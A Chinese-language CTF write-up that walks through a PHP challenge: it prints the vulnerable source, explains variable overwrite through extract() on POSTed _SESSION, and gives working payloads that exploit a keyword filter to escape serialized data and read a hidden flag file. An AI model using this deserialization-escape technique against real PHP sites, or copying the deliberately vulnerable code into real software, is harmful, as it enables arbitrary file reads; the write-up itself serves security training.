# 知识点：

# 1.信息收集

# 2.extract()函数导致的变量覆盖 

### cgctf有类似的题目：

### https://blog.csdn.net/zz_Caleb/article/details/88671071

# 3.关键字过滤导致的任意序列化内容控制

类似[0CTF 2016]piapiapia



# 1.直接给出源码：

```javascript
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```



# 2.extract()函数存在变量覆盖，此处可以直接post _SESSION值，覆盖前面的session



# 3.观察源码，发现phpinfo有提示，查看phpinfo，发现flag所在位置

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/8544AC5ECA1A48D58FD968ABD5D05301clipboard.png)

现在所要做的就是读取d0g3_f1ag.php的内容



# 4.发现存在文件读取

```javascript
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```



但是需要unserialize之后，再base64解码才能读取到flag



# 5. 发现需要绕过的点：

当get img_path时，get的值会被sha加密，从而无法被解码。但是当不get image_path则img内容是固定的，不能读取flag

```javascript
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));
```



# 6. 发现filter()函数，在serlialize之后，filter函数会过滤其中的非法字符

```javascript
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
```



此时联想到[0CTF 2016]piapiapia的通过过滤非法字符来构造任意序列化数据



# 7.构造payload

```javascript
get: f=show_image
post: _SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}
```



# 8. payload解释：

## 8.1 f=show_image 让代码执行到反序列化

```javascript
else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```



## 8.2 _SESSION[user]=flagflagflagflagflagflag 

6个flag长度为24刚好等于后面function序列化的长度：

```javascript
";s:8:"function";s:59:"a    //24位，此时变成了user的内容
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/9C70C1998D1C44968F24C900AB089EF3clipboard.png)



## 8.3 a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";

ZDBnM19mMWFnLnBocA==为d0g3_f1ag.php的base64编码



## 8.4 s:2:"dd";s:1:"a"; 这是因为一开始就有三个数据，通过过滤之后只有两个数据，此时要添加一个保持完整



# 9. 发现flag，在d0g3_fllllllag，重新构造读取

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/4F227C76D25E4257A4B1492586C20229clipboard.png)

post:

```javascript
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";}
```

